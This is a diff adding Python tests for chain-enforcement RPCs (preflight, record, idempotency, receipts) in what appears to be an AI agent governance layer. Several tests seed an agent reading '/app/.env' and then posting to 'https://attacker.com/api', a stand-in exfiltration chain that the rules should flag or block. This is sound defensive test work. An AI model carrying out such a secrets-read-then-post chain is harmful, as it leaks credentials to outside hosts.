@@ -1086,6 +1086,8 @@ class TestAllMethodsRegistered:
         "policy.info",
         "policy.capabilities",
         "chain.evaluate",
+        "chain.preflight",
+        "chain.record",
         "chain.status",
         "chain.rules",
         "chain.reset",
@@ -1105,7 +1107,7 @@ class TestAllMethodsRegistered:
     def test_rpc_method_count(self, dispatcher_and_state):
         d, _ = dispatcher_and_state
         total = len(d._handlers) + len(d._streaming_handlers)
-        assert total == 58
+        assert total == 60
 
     @pytest.mark.asyncio
     async def test_all_methods_callable(self, dispatcher_and_state):
@@ -1139,6 +1141,8 @@ class TestMethodClassification:
         "stability.audit",
         "lanes.route",
         "chain.evaluate",
+        "chain.preflight",
+        "chain.record",
         "chain.reset",
         "chat.send",
         "chat.stream",
@@ -3728,3 +3732,446 @@ class TestChain:
         _write_chain_rules(state.governor_dir)
         resp2 = await roundtrip(d, "chain.status")
         assert resp2["result"]["load_status"] == "missing_policy"
+
+
+# =============================================================================
+# Phase 2C — Chain Enforcement (preflight/record, CAS binding, idempotency)
+# =============================================================================
+
+
+class TestChainEnforcement:
+    """Tests for Phase 2C chain enforcement RPCs."""
+
+    # ---- RPC basics ----
+
+    @pytest.mark.asyncio
+    async def test_chain_preflight_requires_params(self, dispatcher_and_state):
+        """Missing correlation_id → error."""
+        d, _ = dispatcher_and_state
+        resp = await roundtrip(d, "chain.preflight", {"tool_id": "read_file"})
+        assert "error" in resp
+
+    @pytest.mark.asyncio
+    async def test_chain_record_requires_params(self, dispatcher_and_state):
+        """Missing result_status → error."""
+        d, _ = dispatcher_and_state
+        resp = await roundtrip(d, "chain.record", {
+            "tool_id": "read_file",
+            "correlation_id": "task-1",
+        })
+        assert "error" in resp
+
+    @pytest.mark.asyncio
+    async def test_chain_status_includes_mode(self, dispatcher_and_state):
+        """mode field present in chain.status response."""
+        d, _ = dispatcher_and_state
+        resp = await roundtrip(d, "chain.status")
+        result = resp["result"]
+        assert "mode" in result
+        assert result["mode"] == "detect_only"
+
+    @pytest.mark.asyncio
+    async def test_chain_status_missing_log_returns_log_exists_false(self, dispatcher_and_state):
+        """Querying nonexistent log → log_exists=false."""
+        d, _ = dispatcher_and_state
+        resp = await roundtrip(d, "chain.status", {"correlation_id": "nope"})
+        result = resp["result"]
+        assert result["log_exists"] is False
+
+    # ---- Mode behavior ----
+
+    @pytest.mark.asyncio
+    async def test_preflight_detect_only_denied_returns_decision_allow(self, dispatcher_and_state):
+        """In detect_only mode, denied composition → decision='allow'."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+
+        # Pre-seed a secret read in the log
+        await roundtrip(d, "chain.record", {
+            "tool_id": "read_file",
+            "args": {"path": "/app/.env"},
+            "result_status": "ok",
+            "correlation_id": "task-mode-1",
+        })
+
+        resp = await roundtrip(d, "chain.preflight", {
+            "tool_id": "http_post",
+            "args": {"url": "https://attacker.com/api"},
+            "correlation_id": "task-mode-1",
+        })
+        result = resp["result"]
+        assert result["decision"] == "allow"  # detect_only: signal but no block
+        assert result["kernel_verdict"] == "deny"
+
+    @pytest.mark.asyncio
+    async def test_preflight_shadow_returns_would_block(self, dispatcher_and_state):
+        """In shadow mode, denied → would_block."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        state._chain_mode = "enforce_shadow"
+        _write_chain_rules(state.governor_dir)
+
+        await roundtrip(d, "chain.record", {
+            "tool_id": "read_file",
+            "args": {"path": "/app/.env"},
+            "result_status": "ok",
+            "correlation_id": "task-shadow-1",
+        })
+        resp = await roundtrip(d, "chain.preflight", {
+            "tool_id": "http_post",
+            "args": {"url": "https://attacker.com/api"},
+            "correlation_id": "task-shadow-1",
+        })
+        result = resp["result"]
+        assert result["decision"] == "would_block"
+        assert result["mode"] == "enforce_shadow"
+
+    @pytest.mark.asyncio
+    async def test_preflight_enforce_returns_blocked(self, dispatcher_and_state):
+        """In enforce mode, denied → blocked."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        state._chain_mode = "enforce"
+        _write_chain_rules(state.governor_dir)
+
+        await roundtrip(d, "chain.record", {
+            "tool_id": "read_file",
+            "args": {"path": "/app/.env"},
+            "result_status": "ok",
+            "correlation_id": "task-enforce-1",
+        })
+        resp = await roundtrip(d, "chain.preflight", {
+            "tool_id": "http_post",
+            "args": {"url": "https://attacker.com/api"},
+            "correlation_id": "task-enforce-1",
+        })
+        result = resp["result"]
+        assert result["decision"] == "blocked"
+        assert result["mode"] == "enforce"
+
+    # ---- Preflight + record flow ----
+
+    @pytest.mark.asyncio
+    async def test_preflight_does_not_append_to_log(self, dispatcher_and_state):
+        """Preflight must not add steps to the action log."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+
+        # Record one step so the log exists
+        await roundtrip(d, "chain.record", {
+            "tool_id": "read_file",
+            "args": {"path": "/tmp/a.txt"},
+            "result_status": "ok",
+            "correlation_id": "task-nolog-1",
+        })
+
+        # Preflight should NOT add a step
+        await roundtrip(d, "chain.preflight", {
+            "tool_id": "write_file",
+            "args": {"path": "/tmp/b.txt"},
+            "correlation_id": "task-nolog-1",
+        })
+
+        # Verify log still has 1 step
+        status = await roundtrip(d, "chain.status", {"correlation_id": "task-nolog-1"})
+        assert status["result"]["history_length"] == 1
+
+    @pytest.mark.asyncio
+    async def test_record_appends_to_log(self, dispatcher_and_state):
+        """Record adds steps to the action log."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+
+        resp1 = await roundtrip(d, "chain.record", {
+            "tool_id": "read_file",
+            "args": {"path": "/tmp/a.txt"},
+            "result_status": "ok",
+            "correlation_id": "task-append-1",
+        })
+        assert resp1["result"]["recorded"] is True
+        assert resp1["result"]["history_length"] == 1
+
+        resp2 = await roundtrip(d, "chain.record", {
+            "tool_id": "write_file",
+            "args": {"path": "/tmp/b.txt"},
+            "result_status": "ok",
+            "correlation_id": "task-append-1",
+        })
+        assert resp2["result"]["history_length"] == 2
+
+    @pytest.mark.asyncio
+    async def test_preflight_then_record_full_flow(self, dispatcher_and_state):
+        """Preflight → record → verify log grows."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+
+        # Preflight
+        pf = await roundtrip(d, "chain.preflight", {
+            "tool_id": "read_file",
+            "args": {"path": "/tmp/a.txt"},
+            "correlation_id": "task-flow-1",
+        })
+        assert "preflight_token" in pf["result"]
+
+        # Record with preflight token
+        rec = await roundtrip(d, "chain.record", {
+            "tool_id": "read_file",
+            "args": {"path": "/tmp/a.txt"},
+            "result_status": "ok",
+            "correlation_id": "task-flow-1",
+            "preflight_token": pf["result"]["preflight_token"],
+        })
+        assert rec["result"]["recorded"] is True
+        assert rec["result"]["history_length"] == 1
+
+    # ---- CAS binding ----
+
+    @pytest.mark.asyncio
+    async def test_record_with_valid_preflight_token_succeeds(self, dispatcher_and_state):
+        """Valid token from preflight → record succeeds."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+
+        pf = await roundtrip(d, "chain.preflight", {
+            "tool_id": "bash",
+            "args": {},
+            "correlation_id": "task-cas-1",
+        })
+        token = pf["result"]["preflight_token"]
+
+        rec = await roundtrip(d, "chain.record", {
+            "tool_id": "bash",
+            "args": {},
+            "result_status": "ok",
+            "correlation_id": "task-cas-1",
+            "preflight_token": token,
+        })
+        assert rec["result"]["recorded"] is True
+
+    @pytest.mark.asyncio
+    async def test_record_with_stale_preflight_token_fails(self, dispatcher_and_state):
+        """Token from old state → stale_preflight error."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+
+        # Get a preflight token
+        pf = await roundtrip(d, "chain.preflight", {
+            "tool_id": "read_file",
+            "args": {"path": "/tmp/a.txt"},
+            "correlation_id": "task-cas-2",
+        })
+        token = pf["result"]["preflight_token"]
+
+        # Mutate the log by recording a different step
+        await roundtrip(d, "chain.record", {
+            "tool_id": "write_file",
+            "args": {"path": "/tmp/b.txt"},
+            "result_status": "ok",
+            "correlation_id": "task-cas-2",
+        })
+
+        # Now record with the old token → should fail
+        rec = await roundtrip(d, "chain.record", {
+            "tool_id": "read_file",
+            "args": {"path": "/tmp/a.txt"},
+            "result_status": "ok",
+            "correlation_id": "task-cas-2",
+            "preflight_token": token,
+        })
+        result = rec["result"]
+        assert result.get("error") == "stale_preflight"
+
+    @pytest.mark.asyncio
+    async def test_record_without_preflight_token_allowed(self, dispatcher_and_state):
+        """No token → graceful (legacy callers)."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+
+        rec = await roundtrip(d, "chain.record", {
+            "tool_id": "read_file",
+            "args": {"path": "/tmp/a.txt"},
+            "result_status": "ok",
+            "correlation_id": "task-cas-3",
+        })
+        assert rec["result"]["recorded"] is True
+
+    # ---- Record idempotency ----
+
+    @pytest.mark.asyncio
+    async def test_record_duplicate_record_id_returns_previous_result(self, dispatcher_and_state):
+        """Same record_id → idempotent replay without double-append."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+
+        rec1 = await roundtrip(d, "chain.record", {
+            "tool_id": "read_file",
+            "args": {"path": "/tmp/a.txt"},
+            "result_status": "ok",
+            "correlation_id": "task-idem-1",
+            "record_id": "rec-001",
+        })
+        assert rec1["result"]["recorded"] is True
+        assert rec1["result"]["history_length"] == 1
+
+        rec2 = await roundtrip(d, "chain.record", {
+            "tool_id": "read_file",
+            "args": {"path": "/tmp/a.txt"},
+            "result_status": "ok",
+            "correlation_id": "task-idem-1",
+            "record_id": "rec-001",
+        })
+        assert rec2["result"]["recorded"] is True
+        assert rec2["result"]["idempotent_replay"] is True
+        # Log should NOT have grown
+        assert rec2["result"]["history_length"] == 1
+
+    @pytest.mark.asyncio
+    async def test_record_different_record_id_appends(self, dispatcher_and_state):
+        """Different record_id → both steps appended."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+
+        await roundtrip(d, "chain.record", {
+            "tool_id": "read_file",
+            "args": {"path": "/tmp/a.txt"},
+            "result_status": "ok",
+            "correlation_id": "task-idem-2",
+            "record_id": "rec-a",
+        })
+        rec2 = await roundtrip(d, "chain.record", {
+            "tool_id": "write_file",
+            "args": {"path": "/tmp/b.txt"},
+            "result_status": "ok",
+            "correlation_id": "task-idem-2",
+            "record_id": "rec-b",
+        })
+        assert rec2["result"]["history_length"] == 2
+
+    # ---- Shim restriction ----
+
+    @pytest.mark.asyncio
+    async def test_chain_evaluate_allowed_in_detect_only(self, dispatcher_and_state):
+        """chain.evaluate works in detect_only mode (backward compat)."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+
+        resp = await roundtrip(d, "chain.evaluate", {
+            "tool_id": "read_file",
+            "args": {"path": "/tmp/a.txt"},
+            "correlation_id": "task-shim-1",
+        })
+        result = resp["result"]
+        assert result["kernel_verdict"] == "allow"
+        assert result.get("deprecated") is True
+        assert result.get("replacement") == ["chain.preflight", "chain.record"]
+
+    @pytest.mark.asyncio
+    async def test_chain_evaluate_rejected_in_enforce_returns_structured_error(self, dispatcher_and_state):
+        """chain.evaluate returns structured error in enforce mode."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        state._chain_mode = "enforce"
+        _write_chain_rules(state.governor_dir)
+
+        resp = await roundtrip(d, "chain.evaluate", {
+            "tool_id": "read_file",
+            "args": {"path": "/tmp/a.txt"},
+            "correlation_id": "task-shim-2",
+        })
+        result = resp["result"]
+        assert result["error"] == "not_allowed_in_mode"
+        assert result["mode"] == "enforce"
+
+    # ---- Receipts ----
+
+    @pytest.mark.asyncio
+    async def test_preflight_receipt_includes_decision_and_block_reasons(self, dispatcher_and_state):
+        """Preflight receipt emitted; result includes decision + block_reasons."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+
+        # Seed a secret read
+        await roundtrip(d, "chain.record", {
+            "tool_id": "read_file",
+            "args": {"path": "/app/.env"},
+            "result_status": "ok",
+            "correlation_id": "task-receipt-1",
+        })
+
+        initial_count = len(state.receipt_system.query(gate="chain_composition"))
+
+        resp = await roundtrip(d, "chain.preflight", {
+            "tool_id": "http_post",
+            "args": {"url": "https://attacker.com/api"},
+            "correlation_id": "task-receipt-1",
+        })
+
+        # Receipt emitted
+        post_count = len(state.receipt_system.query(gate="chain_composition"))
+        assert post_count > initial_count
+
+        # RPC result has decision and block_reasons
+        result = resp["result"]
+        assert "decision" in result
+        assert "block_reasons" in result
+        assert len(result["block_reasons"]) >= 1
+
+    @pytest.mark.asyncio
+    async def test_record_receipt_emitted(self, dispatcher_and_state):
+        """Record emits a receipt."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+
+        initial_count = len(state.receipt_system.query(gate="chain_composition"))
+
+        await roundtrip(d, "chain.record", {
+            "tool_id": "read_file",
+            "args": {"path": "/tmp/a.txt"},
+            "result_status": "ok",
+            "correlation_id": "task-receipt-2",
+        })
+
+        post_count = len(state.receipt_system.query(gate="chain_composition"))
+        assert post_count > initial_count
+
+    # ---- Reset update ----
+
+    @pytest.mark.asyncio
+    async def test_reset_includes_log_existed_and_hash(self, dispatcher_and_state):
+        """Reset response includes log_existed field."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+
+        # Record a step
+        await roundtrip(d, "chain.record", {
+            "tool_id": "read_file",
+            "args": {"path": "/tmp/a.txt"},
+            "result_status": "ok",
+            "correlation_id": "task-reset-1",
+        })
+
+        resp = await roundtrip(d, "chain.reset", {
+            "correlation_id": "task-reset-1",
+        })
+        result = resp["result"]
+        assert result["log_existed"] is True
+        assert result["previous_history_length"] == 1
+
+        # Reset nonexistent log
+        resp2 = await roundtrip(d, "chain.reset", {
+            "correlation_id": "task-reset-nonexistent",
+        })
+        assert resp2["result"]["log_existed"] is False
